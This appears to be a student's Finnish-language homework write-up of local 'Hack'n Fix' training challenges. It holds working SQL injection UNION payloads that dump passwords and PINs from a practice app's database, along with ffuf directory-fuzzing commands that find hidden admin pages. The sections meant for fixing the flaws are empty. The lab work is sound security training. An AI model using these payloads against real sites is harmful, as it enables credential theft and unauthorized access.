# H2 Break & unbreak
## Ympäristö
- Windows 11 PC
- Vmware workstation pro 17
- [Kali linux VMware image](https://www.kali.org/get-kali/#kali-virtual-machines)

## x)

## a) Murtaudu 010-staff-only. Hack'n Fix
### Tehtävän alustus
Aloitetaan lataamalla tehtävät
```GNOME
wget https://terokarvinen.com/hack-n-fix/teros-challenges.zip
unzip teros-challenges.zip
```
Siirrytään kansioon ja käynnistetään tehtävän verkkosivu
```GNOME
cd challenges/010-staff-only/
python3 staff-only.py
```
![part1](/kuvat/staff-only1.png)
### Ratkaisu
 - Avataan sivu verkkoselaimessa, esim Mozilla firefox http://127.0.0.1:5000/
 - Avataan Element picker **Ctrl+Shift+C**
 - Tutkimalla verkkosivua huomataan, että pinkoodien takana oleva lomake vaatii **numeroita!**
 - Ei hätää, sen voi vaatimuksen voi vain poistaa **web developer toolssissa**

 ![part2](/kuvat/staff-only2.png)
 - Tämän jälkeen lomakeesta voi lähettää stringin!
 - Luin tehtävää varten [portswiggeristä](https://portswigger.net/web-security/sql-injection/union-attacks) artikkelin **UNION** hyökkäyksistä joiden avulla voidaan sql injektiossa lähettää toinen haku sql tietokantaan
 - Piippu operaattorilla | | saadaan lisämausteena korkattua myös pinkoodit salasanojen kanssa  
 ```
 ' UNION SELECT password || '~' || pin FROM pins --
 ```
- Your password is **SUPERADMIN%%rootALL-FLAG{Tero-e45f8764675e4463db969473b6d0fcdd}~11112222333**
- Lisäämällä **LIMIT** operaattori voidaan käydä tietokantaa läpi
```
' UNION SELECT password || '~' || pin FROM pins LIMIT 2,1 --
```
-  foo~321
-  loremipsum~321


## b) Korjaa 010-staff-only haavoittuvuus lähdekoodista. Osoita testillä, että ratkaisusi toimii.

## c) Ratkaise dirfuzt-1 artikkelista Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf.
### Tehtävän alustus
 - Avaa terminaali ja lataa tehtävä
```GNOME
wget https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/dirfuzt-0
chmod 744 dirfuzt-0
./dirfuzt-0
```
 - Seuraavaksi ladataan lista stringejä jota ffuf voi käydä läpi

 ```GNOME
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
 ```

 - Avataan uusi terminaali jossa käytämme ffuf työkalua, joka toimitetaan nykyään kali linuxin mukana
 - "-w" operaattorilla tarjotaan ffufferille lista sanoja (Tässä tapauksessa common.txt)
 - "-u" operaattorilla taas tarjotaan url mistä ohjelma tutkii sivuja muutujan avulla FUZZ 
 - ffuf siis korvaa muuttujan FUZZ arvon jokaista common.txt stringiä kohden

 ```GNOME
 ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ
 ```
![ffuf1](/kuvat/ffuf1.png)
 - ffuf on tulostanut kaikki 4750 vaihtoehtoa ja huomataan tulosteissa yhtäläisyyksiä
 - Käydään tarkistamassa muutama url http://127.0.0.2:8000/.env ja http://127.0.0.2:8000/.git

 ![ffuf2](/kuvat/ffuf2.png)
 - Sivut ovat saman kaltaisia.
 - ffufilla voidaan filtteröidä tuloksia eri operaattoreilla, käytämme seuraavaksi "-fs" filter size operaattoria filtteröimällä pois kaikki sivu joiden merkkikoko on **132**
 ```GNOME
  ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ -fs 132
 ```
 - Täten saadaan huomattavasti tiiviipi tuloste

 ![ffuf3](/kuvat/ffuf3.png)
 - Huomataan että urlissa http://127.0.0.2:8000/admin löytyi sivu jossa on 160 merkkiä, käydään katsomassa.
 
 ![ffuf4](/kuvat/ffuf4.png)


## d) Murtaudu 020-your-eyes-only. Hack'n Fix
### Tehtävän alustus
 - Avataan tehtävä ja ladataan virtualenv 
 ```GNOME
 cd ~
 cd challenges/020-your-eyes-only/
 sudo apt-get -y install virtualenv
 virtualenv virtualenv/ -p python3 --system-site-packages
 ```
 - Aktivoidaan virtualenv
 ```GNOME
 source virtualenv/bin/activate
 ```
 - Ladataan django minkä avulla tehtävän sivusto pyörii
 ```GNOME
cat requirements.txt
pip install -r requirements.txt
 ```
 - Alustetaan tietokanta ja käynnistetään django
 ```GNOME
  cd logtin/
  ./manage.py makemigrations; ./manage.py migrate
  ./manage.py runserver
 ```
 ![020-1](/kuvat/020-1.png)

 - Käydään katsomassa miltä sivusto näyttää
 
 ![020-2](/kuvat/020-2.png)

 ### Tehtävän ratkaisu
  - Avataan uusi terminaali ja hyödynnetään ffuferia kuten edellisessä tehtävässä.
  ```GNOME
   ffuf -w common.txt -u http://127.0.0.1:8000/FUZZ
  ```
  ![020-3](/kuvat/020-3.png)
  - ffuf löysi /admin-console päätteisen sivun, käydään katsomassa

  ![020-4](/kuvat/020-4.png)
## e Korjaa 020-your-eyes-only haavoittuvuus. Osoita testillä, että ratkaisusi toimii.
